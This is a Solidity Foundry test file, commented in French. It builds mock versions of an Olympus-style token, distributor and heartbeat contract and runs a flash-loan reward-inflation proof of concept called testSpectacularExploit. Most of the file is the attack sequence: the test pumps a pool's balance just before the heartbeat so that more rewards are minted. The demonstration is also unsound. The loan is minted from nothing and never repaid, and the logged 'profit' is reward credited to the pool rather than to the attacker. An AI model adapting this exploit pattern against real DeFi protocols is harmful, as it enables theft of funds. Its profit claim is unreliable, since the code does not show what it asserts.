// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// Mocks pour la démonstration locale
contract MockOHM {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) public { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockDistributor {
    MockOHM public ohm;
    uint256 public rewardRate = 1e7; // 1%
    uint256 public constant DENOMINATOR = 1e9;

    constructor(MockOHM _ohm) { ohm = _ohm; }

    function distribute(address pool) public {
        uint256 reward = (ohm.balanceOf(pool) * rewardRate) / DENOMINATOR;
        ohm.mint(pool, reward);
    }
}

contract MockHeart {
    MockDistributor public distributor;
    address public pool;
    uint256 public lastBeat;
    uint256 public frequency = 8 hours;

    constructor(MockDistributor _distributor, address _pool) {
        distributor = _distributor;
        pool = _pool;
        lastBeat = block.timestamp;
    }

    function beat() public {
        require(block.timestamp >= lastBeat + frequency, "Heart_OutOfCycle");
        distributor.distribute(pool);
        lastBeat = block.timestamp;
    }
}

contract DistributorExploitTest is Test {
    MockOHM ohm;
    MockDistributor distributor;
    MockHeart heart;
    address pool = address(0x123);

    function setUp() public {
        ohm = new MockOHM();
        distributor = new MockDistributor(ohm);
        heart = new MockHeart(distributor, pool);
    }

    function testSpectacularExploit() public {
        // 1. Attendre la fenêtre de beat
        vm.warp(block.timestamp + 8 hours);

        // 2. Flash Loan (Simulation)
        uint256 flashAmount = 100_000_000 * 1e9;
        ohm.mint(address(this), flashAmount);
        emit log_named_uint("Flash Loan obtenu", flashAmount / 1e9);

        // 3. Injection dans le pool (Atomique)
        ohm.transfer(pool, flashAmount);
        emit log_named_uint("Balance du pool avant beat", ohm.balanceOf(pool) / 1e9);

        // 4. Déclenchement du Beat
        heart.beat();

        // 5. Résultat
        uint256 poolBalanceAfter = ohm.balanceOf(pool);
        emit log_named_uint("Balance du pool apres beat", poolBalanceAfter / 1e9);
        
        uint256 profit = (poolBalanceAfter - flashAmount);
        emit log_named_uint("Profit genere par l'inflation", profit / 1e9);

        assertTrue(profit > 0, "Exploit failed");
    }
}
